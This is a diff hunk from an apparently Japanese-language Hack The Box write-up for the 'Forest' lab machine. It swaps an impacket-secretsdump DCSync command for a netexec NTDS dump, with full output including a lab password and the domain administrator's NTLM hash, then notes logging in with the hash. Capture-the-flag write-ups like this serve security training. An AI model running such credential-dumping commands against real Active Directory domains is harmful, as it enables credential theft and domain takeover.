@@ -164,13 +164,16 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 フルコン権限でdcsync攻撃
 ```sh
-└─$ impacket-secretsdump -just-dc-user administrator -just-dc-ntlm 'htb.local/svc-alfresco:s3rvice@10.129.95.210'
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
-[*] Cleaning up...
+└─$ netexec smb 10.129.95.210 -u 'htb.local\svc-alfresco' -p s3rvice --ntds drsuapi --user administrator
+SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
+SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+SMB         10.129.95.210   445    FOREST           [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         10.129.95.210   445    FOREST           [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.129.95.210   445    FOREST           htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+SMB         10.129.95.210   445    FOREST           [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/FOREST_10.129.95.210_2025-08-17_215354.ntds of which 1 were added to the database
+SMB         10.129.95.210   445    FOREST           [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.129.95.210   445    FOREST           [*] cat /home/kali/.nxc/logs/ntds/FOREST_10.129.95.210_2025-08-17_215354.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         10.129.95.210   445    FOREST           [*] grep -iv disabled /home/kali/.nxc/logs/ntds/FOREST_10.129.95.210_2025-08-17_215354.ntds | cut -d ':' -f1
 ```
 administratorのハッシュでログイン成功！ルートフラグゲット
 ```powreshell
